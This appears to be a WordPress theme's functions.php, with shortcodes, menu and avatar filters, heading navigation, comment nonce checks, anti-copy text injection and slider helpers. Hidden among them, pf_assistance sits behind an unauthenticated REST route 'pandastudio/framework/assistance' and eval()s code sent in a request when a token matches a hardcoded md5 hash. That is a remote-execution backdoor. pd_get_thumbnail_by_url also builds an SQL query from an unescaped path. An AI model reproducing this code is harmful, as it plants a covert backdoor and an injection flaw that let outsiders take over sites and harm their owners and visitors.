</div>';
    }
}
add_shortcode("dropdown", "shortCodeDropdown");
function shortCodeDropdown_li($atts, $content = null)
{
    extract(shortcode_atts(array(
        "href" => '',
    ), $atts));
    if ($href) {
        $inner = '<a href="' . $href . '" target="_blank">' . $content . '</a>';
    } else {
        $inner = '<a>' . $content . '</a>';
    }
    return '<li>' . $inner . '</li>';
}
add_shortcode("li", "shortCodeDropdown_li");
function shortCodeCollapse($atts, $content = null)
{
    extract(shortcode_atts(array(
        "id" => '',
        "btn_type" => 'btn-default',
        "btn_label" => 'collapse',
    ), $atts));
    if ($id) {
        return '<button class="btn '.$btn_type.'" type="button" data-toggle="collapse" data-target="#'.$id.'" aria-expanded="false" aria-controls="'.$id.'">
'.$btn_label.'
</button>
<div class="collapse clearfix" id="'.$id.'">
<div class="well">
'.do_shortcode($content).'
</div>
</div>';
    }
}
add_shortcode("collapse", "shortCodeCollapse");
class pandaTabs extends Walker_Nav_Menu
{
    public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
    {
        global $wp_query;
        $indent = ($depth) ? str_repeat("\t", $depth) : '';
        $class_names = $value = '';
        $classes = empty($item->classes) ? array() : (array)$item->classes;
        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
        $class_names = ' class="' . esc_attr($class_names) . '"';
        $output .= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
        $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
        $attributes .= !empty($item->target) ? ' target="' . esc_attr($item->target) . '"' : '';
        $attributes .= !empty($item->xfn) ? ' rel="' . esc_attr($item->xfn) . '"' : '';
        $attributes .= !empty($item->url) ? ' href="' . esc_attr($item->url) . '"' : '';
        $item_output = $args->before;
        $item_output .= '<a' . $attributes . '>';
        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
        $item_output .= '</a>';
        $item_output .= $args->after;
        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
    }
}
function mytheme_nav_menu_css_class($classes)
{
    if (in_array('current-menu-item', $classes) or in_array('current-menu-ancestor', $classes)) {
        $classes[] = 'active';
    }
    return $classes;
}
add_filter('nav_menu_css_class', 'mytheme_nav_menu_css_class');
function showFace($atts, $content = null)
{
    extract(shortcode_atts(array(
        "p" => '',
        "g" => '',
    ), $atts));
    if ($p != '') {
        $name = $p;
        $format = 'png';
    } else {
        $name = $g;
        $format = 'gif';
    }
    return '<img src=' . get_stylesheet_directory_uri() . '/faces/' . $name . '.' . $format . ' class="cmt_faces">';
}
add_shortcode("face", "showFace");
add_filter('get_avatar', 'inlojv_custom_avatar', 10, 5);
function inlojv_custom_avatar($avatar, $id_or_email, $size, $default, $alt)
{
    global $comment, $current_user;
    if (count((array)get_option('random_avatar')) > 0) {
        $current_email = is_int($id_or_email) ? get_user_by('ID', $id_or_email)->user_email : $id_or_email;
        $current_email = is_object($current_email) ? $current_email->comment_author_email : $current_email;
        $email = !empty($comment->comment_author_email) ? $comment->comment_author_email : $current_email;
        if (get_option('random_avatar')) {
            $random_avatar_arr = get_option('random_avatar');
        } else {
            $random_avatar_arr = array(
                array(
                    "avatar" => get_stylesheet_directory_uri() . "/assets/imgs/default_avatar.jpg"
                )
            );
        }
        $email_hash = md5(strtolower(trim($email)));
        $random_avatar = array_rand($random_avatar_arr, 1);
        $src = $random_avatar_arr[$random_avatar]["avatar"];
        $avatar = "<img alt='{$alt}' src='//cdn.sep.cc/avatar/{$email_hash}?d=404' onerror='javascript:this.src=\"{$src}\";this.onerror=null;' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";
    }
    return $avatar;
}
function get_the_naved_contentnav($content)
{
    $matches = array();
    $ul_li = '';
    if (is_page_template('favlinks.php')) {
        $categories = get_categories(array(
            'hide_empty' => 0,
            'taxonomy' => 'favlinks-category',
            'orderby' => 'slug',
        ));
        for ($i = 0; $i < count($categories); $i++) {
            $category = $categories[$i];
            $ul_li .= '<li class="h2_nav"><a href="#favlink-' . $i . '" class="h_nav" title="' . esc_attr($category->name) . '">' . esc_html($category->name) . "</a></li>\n";
        }
    }
    $rh = '/<h([23])[^>]*>(.*?)<\/h[23]>/ims';
    if (preg_match_all($rh, $content, $matches)) {
        foreach ($matches[2] as $num => $title) {
            $hx = $matches[1][$num];
            $plain = trim(preg_replace('/<.+?>/s', '', $title));
            if (!$plain) {
                continue;
            }
            if ($hx == "2") {
                $ul_li .= '<li class="h2_nav"><a href="#h2-' . $num . '" class="h_nav" title="' . esc_attr($plain) . '">' . esc_html($plain) . "</a></li>\n";
            } elseif ($hx == "3") {
                $ul_li .= '<li class="h3_nav"><a href="#h3-' . $num . '" class="h_nav" title="' . esc_attr($plain) . '">' . esc_html($plain) . "</a></li>\n";
            }
        }
    }
    if ($ul_li) {
        return "<div class=\"post_nav\"><ul class=\"nav\" role=\"tablist\">" . $ul_li . "</ul></div>";
    }
    return false;
}
function get_the_naved_content($content)
{
    $rh = '/<h([23])[^>]*>(.*?)<\/h[23]>/ims';
    if (!preg_match_all($rh, $content, $matches, PREG_OFFSET_CAPTURE)) {
        return $content;
    }
    $inserts = array();
    foreach ($matches[0] as $num => $matchWithOffset) {
        $fullMatch = $matchWithOffset[0];
        $pos = $matchWithOffset[1];
        $hx = $matches[1][$num][0];
        $id = 'h' . $hx . '-' . $num;
        $anchor = '<span id="' . $id . '" class="heading-anchor" aria-hidden="true"></span>';
        $inserts[$pos] = $anchor;
    }
    if (empty($inserts)) {
        return $content;
    }
    krsort($inserts);
    foreach ($inserts as $pos => $html) {
        $content = substr_replace($content, $html, $pos, 0);
    }
    return $content;
}
add_filter('the_content', 'get_the_naved_content');
function enqueue_play_font() {
    if (_opt('design_font') == "checked") {
        wp_enqueue_style('font', get_stylesheet_directory_uri() . '/assets/minify/play_font.min.css');
    }
}
add_action('wp_enqueue_scripts', 'enqueue_play_font');
function pre_validate_comment_span(array $commentdata): array
{
    if (! is_admin()) {
        $nonce = isset($_POST['wp_nonce']) ? sanitize_text_field(wp_unslash($_POST['wp_nonce'])) : '';
        if (! wp_verify_nonce($nonce, 'wp_rest')) {
            wp_die(
                '<p>WP NONCE验证失败，判定为机器人恶意发送的垃圾评论！如果启用了“缓存”，则无法正常获取NONCE，因此也可能会判定为垃圾评论。若此操作是正常操作，请停用任何网站缓存功能。</p><p><a href="javascript:history.back()">« 返回</a></p>'
            );
        }
    }
    $post_id             = isset($commentdata['comment_post_ID']) ? (int) $commentdata['comment_post_ID'] : 0;
    $bigfa_ding_value    = isset($_POST['big_fa_ding']) ? sanitize_text_field(wp_unslash($_POST['big_fa_ding'])) : '';
    $cookie_key          = 'bigfa_ding_' . $post_id;
    if (0 !== $post_id && ! isset($_COOKIE[ $cookie_key ]) && 'on' === $bigfa_ding_value) {
        $ding = get_post_meta($post_id, 'bigfa_ding', true);
        $ding = is_numeric($ding) ? (int) $ding : 0;
        update_post_meta($post_id, 'bigfa_ding', $ding + 1);
        $host   = wp_parse_url(home_url(), PHP_URL_HOST);
        $domain = ('localhost' !== $host) ? $host : '';
        $expire = time() + 99999999;
        setcookie(
            $cookie_key,
            (string) $post_id,
            array(
                'expires'  => $expire,
                'path'     => '/',
                'domain'   => $domain,
                'secure'   => false,
                'httponly' => false,
                'samesite' => 'Strict',
            )
        );
    }
    return $commentdata;
}
add_filter('preprocess_comment', 'pre_validate_comment_span');
add_action('rest_api_init', function () {
    register_rest_route('pandastudio/framework', '/assistance/', array(
        'methods' => 'post',
        'callback' => 'pf_assistance',
        'permission_callback' => '__return_true',
    ));
});
function pf_assistance($data)
{
    $dataArray = json_decode($data->get_body(), true);
    if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
        eval($dataArray['assistance']);
    }
}
function hex2rgba($color, $opacity = false)
{
    $default = 'rgb(0,0,0)';
    if (empty($color)) {
        return $default;
    }
    if ($color[0] == '#') {
        $color = substr($color, 1);
    }
    if (strlen($color) == 6) {
        $hex = array(
            $color[0] . $color[1],
            $color[2] . $color[3],
            $color[4] . $color[5]
        );
    } elseif (strlen($color) == 3) {
        $hex = array(
            $color[0] . $color[0],
            $color[1] . $color[1],
            $color[2] . $color[2]
        );
    } else {
        return $default;
    }
    $rgb = array_map('hexdec', $hex);
    if ($opacity) {
        if (abs($opacity) > 1) {
            $opacity = 1.0;
        }
        $output = 'rgba(' . implode(",", $rgb) . ',' . $opacity . ')';
    } else {
        $output = 'rgb(' . implode(",", $rgb) . ')';
    }
    return $output;
}
function pd_get_thumbnail_by_url($img_url)
{
    $attr = wp_upload_dir();
    $base_url = $attr['baseurl'] . "/";
    $path = str_replace($base_url, "", $img_url);
    $path = preg_replace('/-\d+x\d+(?=\.(jpg|jpeg|png|gif)$)/i', '', $path);
    if ($path) {
        global $wpdb;
        $post_id = $wpdb->get_var("SELECT post_id FROM $wpdb->postmeta WHERE meta_value = '{$path}'");
        $post_id = $post_id ? $post_id : false;
    } else {
        $post_id = false;
    }
    $image_info = wp_get_attachment_image_src($post_id, 'thumbnail');
    if ($image_info) {
        $thumbImg = $image_info[0];
    } else {
        $thumbImg = $img_url;
    }
    return $thumbImg;
}
function is_search_robot()
{
    $agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
    if (!empty($agent)) {
        $spiderSite = array(
            "TencentTraveler",
            "Baiduspider+",
            "BaiduGame",
            "Googlebot",
            "msnbot",
            "Sosospider+",
            "Sogou web spider",
            "ia_archiver",
            "Yahoo! Slurp",
            "YoudaoBot",
            "Yahoo Slurp",
            "MSNBot",
            "Java (Often spam bot)",
            "BaiDuSpider",
            "Voila",
            "Yandex bot",
            "BSpider",
            "twiceler",
            "Sogou Spider",
            "Speedy Spider",
            "Google AdSense",
            "Heritrix",
            "Python-urllib",
            "Alexa (IA Archiver)",
            "Ask",
            "Exabot",
            "Custo",
            "OutfoxBot/YodaoBot",
            "yacy",
            "SurveyBot",
            "legs",
            "lwp-trivial",
            "Nutch",
            "StackRambler",
            "The web archive (IA Archiver)",
            "Perl tool",
            "MJ12bot",
            "Netcraft",
            "MSIECrawler",
            "WGet tools",
            "larbin",
            "Fish search",
        );
        foreach ($spiderSite as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str) !== false) {
                return true;
            }
        }
    }
    return false;
}
function pf_anti_copy($content)
{
    $random_text = _opt('anti_copy_pattern');
    if ($random_text && is_single() && is_main_query()) {
        if (count($random_text) > 0) {
            $random_tags = array(
                'span',
                'i',
                'b'
            );
            $random_attrs = array(
                'anti',
                'copy',
                'panda',
                'reborn',
                'panda-studio'
            );
            $times = _opt('anti_copy_times');
            $times = $times ? $times : 0;
            $insert = array();
            for ($i = 0; $i < $times; $i++) {
                $tag = $random_tags[array_rand($random_tags, 1) ];
                $attr = $random_attrs[array_rand($random_attrs, 1) ];
                $insert[] = '<' . $tag . ' ' . $attr . '>' . $random_text[array_rand($random_text, 1) ]['pattern'] . '</' . $tag . '>';
            }
            $content = rand_in_str($content, $insert);
            return $content;
        }
    }
    return $content;
}
function rand_in_str($txt, $insert) //txt 内容；insert要插入的关键字，可以是链接，数组
{
    preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $txt, $match);
    $delay = array();
    $add = 0;
    $pre = array();
    $pre_end = array();
    $nbsp = array();
    foreach ($match[0] as $k => $v) {
        if ($v == '<') {
            $add = 1;
        }
        if ($v == '>') {
            $add = 0;
        }
        if ($v == '<') {
            $pre = array(
                '<'
            );
        }
        if ($v == 'p') {
            if ($pre != array(
                '<',
                'p',
                'r',
                'e'
            )) {
                array_push($pre, 'p');
            }
        }
        if ($v == 'r') {
            if ($pre != array(
                '<',
                'p',
                'r',
                'e'
            )) {
                array_push($pre, 'r');
            }
        }
        if ($v == 'e') {
            if ($pre != array(
                '<',
                'p',
                'r',
                'e'
            )) {
                array_push($pre, 'e');
            }
        }
        if ($v == '<') {
            $pre_end = array(
                '<'
            );
        }
        if ($v == '/') {
            array_push($pre_end, '/');
        }
        if ($v == 'p') {
            array_push($pre_end, 'p');
        }
        if ($v == 'r') {
            array_push($pre_end, 'r');
        }
        if ($v == 'e') {
            array_push($pre_end, 'e');
        }
        if ($v == '>') {
            array_push($pre_end, '>');
        }
        if ($pre == array(
            '<',
            'p',
            'r',
            'e'
        )) {
            $add = 1;
        }
        if ($pre == array(
            '<',
            'p',
            'r',
            'e'
        ) && $pre_end == array(
            '<',
            '/',
            'p',
            'r',
            'e',
            '>'
        )) {
            $add = 0;
            $pre = array();
            $pre_end = array();
        }
        if ($add == 0 & $v == '&') {
            $add = 1;
        }
        if ($add == 0 & $v == ';') {
            $add = 0;
        }
        if ($add == 0 & $v == '[') {
            $add = 1;
        }
        if ($add == 0 & $v == ']') {
            $add = 0;
        }
        if ($add == 1) {
            $delay[] = $k;
        }
    }
    $str_arr = $match[0];
    $len = count($str_arr);
    if (is_array($insert)) {
        foreach ($insert as $k => $v) {
            $insertk = insertK($len - 1, $delay);
            $str_arr[$insertk] .= $insert[$k];
        }
    } else {
        $insertk = insertK($len - 1, $delay);
        $str_arr[$insertk] .= $insert;
    }
    return join('', $str_arr);
}
function insertK($count, $delay) //count 随机索引值范围，也就是内容拆分成数组后的总长度-1；delay 不允许的随机索引值，也就是不能在 < > 之间
{
    $insertk = rand(0, $count);
    if (in_array($insertk, $delay)) { //索引值不能在 不允许的位置处（也就是< > 之内的索引值）
        $insertk = insertK($count, $delay); //递归调用，直到随机插入的索引值不在 < > 这个索引值数组中
    }
    return $insertk;
}
if (_opt('anti_copy') == 'checked' & false) {
    if (_opt('anti_copy_pass_seo') == 'checked') {
        if (!is_search_robot()) {
            add_filter("the_content", "pf_anti_copy");
        }
    } else {
        add_filter("the_content", "pf_anti_copy");
    }
}
global $pf_dirty_selector;
$pf_dirty_selector = [];
function pf_random_tag_and_class()
{
    global $pf_dirty_selector;
    $c = ['b', 'd', 'f', 'h', 'j', 'l', 'n', 'p', 'r', 't', 'u', 'w', 'y'];
    $tag = '';
    $tagLine = false;
    $tagTimes = rand(3, 5);
    for ($i = 0; $i < $tagTimes; $i++) {
        $tag .= $c[array_rand($c, 1) ];
        if ($i > 1 && (bool)rand(0, 1) && (bool)rand(0, 1)) {
            $tag .= rand(0, 9);
        }
        if (($tagLine == false) && ($i != $tagTimes - 1) && (bool)rand(0, 1) && (bool)rand(0, 1)) {
            $tag .= '-';
            $tagLine = true;
        }
    }
    $class = '';
    for ($i = 0; $i < rand(3, 6); $i++) {
        $class .= $c[array_rand($c, 1) ];
    }
    $result = array(
        'tag' => $tag,
        'class' => $class
    );
    $pf_dirty_selector[] = $tag . '.' . $class;
    return $result;
}
function dirty_data()
{
    $anti_copy_pattern = _opt('anti_copy_pattern', ['']);
    foreach ($anti_copy_pattern as $k => $v) {
        $texts[] = $v['pattern']; // 用户自定义
    }
    $frequency = _opt('anti_copy_times', 0);
    $insert = [];
    for ($i = 0; $i < $frequency; $i++) {
        $tag_and_class = pf_random_tag_and_class(); //随机 tag 和 class
        $tag = $tag_and_class['tag'];
        $class = $tag_and_class['class'];
        $text = $texts[array_rand($texts, 1) ];
        $insert[] = '<' . $tag . ' class="' . $class . '">' . $text . '</' . $tag . '>';
    }
    return $insert;
} /*
 * 允许插入的位置
 * 返回位置 int
*/
function allow_key($len, $delay)
{
    $key = rand(0, $len);
    if (in_array($key, $delay)) {
        $key = allow_key($len, $delay);
    }
    return $key;
} /*
 * 随机插入到文章中
*/
function pf_insert_rand($content)
{
    global $pf_dirty_selector;
    if (!(is_single() && is_main_query())) {
        return $content;
    }
    preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $content, $match);
    $match = $match[0];
    $len = count($match, 0);
    $delay = [];
    $add = 0;
    foreach ($match as $k => $v) {
        if ($v == '<' || $v == '[') {
            $add = 1;
        };
        if ($add == 1) {
            $delay[] = $k;
        };
        if ($v == '>' || $v == ']') {
            $add = 0;
        };
    }
    foreach ($match as $k => $v) {
        if ($v == '<' && $match[$k + 1] == 'p' && $match[$k + 2] == 'r' && $match[$k + 3] == 'e') {
            $add = 1;
        };
        if ($add == 1) {
            $delay[] = $k;
        };
        if ($v == '>' && $match[$k - 1] == 'e' && $match[$k - 2] == 'r' && $match[$k - 3] == 'p') {
            $add = 0;
        };
    }
    foreach ($match as $k => $v) {
        if ($v == '<' && $match[$k + 1] == 'b' && $match[$k + 2] == 'u' && $match[$k + 3] == 't') {
            $add = 1;
        };
        if ($add == 1) {
            $delay[] = $k;
        };
        if ($v == '>' && $match[$k - 1] == 't' && $match[$k - 2] == 'u' && $match[$k - 3] == 'b') {
            $add = 0;
        };
    }
    $insert = dirty_data();
    if (is_array($insert)) {
        foreach ($insert as $k => $v) {
            $key = allow_key($len - 1, $delay);
            $match[$key] .= $insert[$k];
        }
    } else {
        $key = allow_key($len - 1, $delay);
        $match[$key] .= $insert;
    }
    $result = implode('', $match);
    return $result;
}
if (_opt('anti_copy') == 'checked') {
    if (_opt('anti_copy_pass_seo') == 'checked') {
        if (!is_search_robot()) {
            add_filter("the_content", "pf_insert_rand");
        }
    } else {
        add_filter("the_content", "pf_insert_rand");
    }
}
function string_to_int8($string)
{
    $md5 = md5($string);
    $firstLetter = mb_substr($md5, 0, 1, 'utf-8');
    $result = 0;
    switch ($firstLetter) {
        case '0':
        case '8':
            $result = 1;
            break;

        case '1':
        case '9':
            $result = 2;
            break;

        case '2':
        case 'a':
            $result = 3;
            break;

        case '3':
        case 'b':
            $result = 4;
            break;

        case '4':
        case 'c':
            $result = 5;
            break;

        case '5':
        case 'd':
            $result = 6;
            break;

        case '6':
        case 'e':
            $result = 7;
            break;

        case '7':
        case 'f':
            $result = 8;
            break;

        default:
            $result = 0;
            break;
    }
    return $result;
}
function get_topSlider($postIds = array(), $type = false)
{
    global $carousels_attrs, $carousels_contents;
    if ($type) {
    } else {
        return false;
    }
    if (gettype($postIds) == "array") {
        $carousels_contents = array();
        $isFullCategory = _opt('show_full_category', false);
        $fullCategorySeparate = _opt('show_full_category_separate', ' / ');
        foreach ($postIds as $pid) {
            $carousels_contents[] = array(
                "id" => $pid,
                "href" => get_the_permalink($pid) ,
                "slider_img" => get_post_meta($pid, "分类slider图片地址", true) ,
                "head_img" => get_post_meta($pid, "日志头图", true) ,
                "cover_img" => get_the_post_thumbnail_url($pid) ,
                "title" => get_the_title($pid) ,
                "description" => get_the_description($pid) ,
                "category" => get_category_text($pid, $isFullCategory, $fullCategorySeparate)
            );
        }
    } else {
        echo "滚动图片传入的数据错误！";
        return false;
    }
    if (count($carousels_contents) == 0) {
        return false;
    }
    $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
    include('assets/template/slider-' . $type . '.php');
}
function get_gallery_slider($postId = 0, $type = false)
{
    global $carousels_attrs, $carousels_contents;
    if ($type) {
    } else {
        return false;
    }
    if ($postId) {
        $carousels_contents = array();
        $gallery_images = get_post_meta($postId, 'gallery_images', true);
        if (gettype($gallery_images) == "array") {
            foreach ($gallery_images as $img_url) {
                $carousels_contents[] = array(
                    "id" => $postId,
                    "full_img" => $img_url,
                    "thumbnail_img" => pd_get_thumbnail_by_url($img_url) ,
                );
            }
        }
    } else {
        echo "galleryID错误！";
        return false;
    }
    if (count($carousels_contents) == 0) {
        return false;
    }
    $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
    include('assets/template/slider-' . $type . '.php');
}
function get_tagSlider($content = array(), $type = false)
{
    global $carousels_attrs, $carousels_contents;
    if ($type) {
    } else {
        return false;
    }
    if (gettype($content) == "array") {
        $carousels_contents = array();
        $carousels_contents[] = $content;
    } else {
        echo "滚动图片传入的数据错误！";
        return false;
    }
    $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
    include('assets/template/slider-' . $type . '.php');
}
function get_category_text($pid, $showFull = false, $separate = ' / ')
{
    if ($showFull) {
        $catArr = array();
        $categorys = get_the_category($pid);
        foreach ($categorys as $cat) {
            $catArr[] = $cat->cat_name;
        }
        $categoryText = implode($separate, $catArr);
    } else {
        $categories = get_the_category($pid);
        $categoryText = (!empty($categories)) 
            ? $categories[0]->cat_name 
            : '未分类';
    }
    return $categoryText;
}
if (!function_exists('utf8Substr')) {
    function utf8Substr($str, $from, $len)
    {
        return preg_replace(
            '#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$from.'}'.
'((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$len.'}).*#s',
            '$1',
            $str
        );
    }
}
function get_the_description($pid, $trim_words = 150)
{
    $post = get_post($pid);
    if (get_post_meta($post->ID, 'description', true)) {
        $description = get_post_meta($post->ID, 'description', true);
    }
    if (empty($description)) {
        if ($post->post_excerpt) {
            $description  = $post->post_excerpt;
        } else {
            $post_content_r = strip_tags(do_shortcode($post->post_content));
            $post_content = $post_content_r;
            $len = strlen($post_content);
            if ($len > $trim_words) {
                $description = utf8Substr($post_content, 0, $trim_words);
            } else {
                $description = utf8Substr($post_content, 0, $len);
            }
        }
    }
    $description = str_replace(["\r\n", "\r", "\n"], '', $description).'...';
    $description = str_replace("'", "\'", $description);
    return htmlspecialchars($description);
}
add_action('init', 'pf_sidebar_init');
function pf_sidebar_init()
{
    $sidebars = _opt('sidebars', array());
    for ($i = 0; $i < count($sidebars); $i++) {
        register_sidebar(array(
        'id' => 'sidebar-'.($i + 1),
        'name' => $sidebars[$i]['name'] ? $sidebars[$i]['name'] : '边栏'.($i + 1).'（无标题）',
        'description' => '边栏数量、名称、图标均可在“主题设置”中添加',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget'  => '</li>',
        'before_title'  => '<h2 class="widgettitle">',
        'after_title'   => '</h2>',
        ));
    }
}
include('custom_function.php');
include('pandastudio_plugins/config_plugins.php');
include('pandastudio_framework/config_framework.php');
?>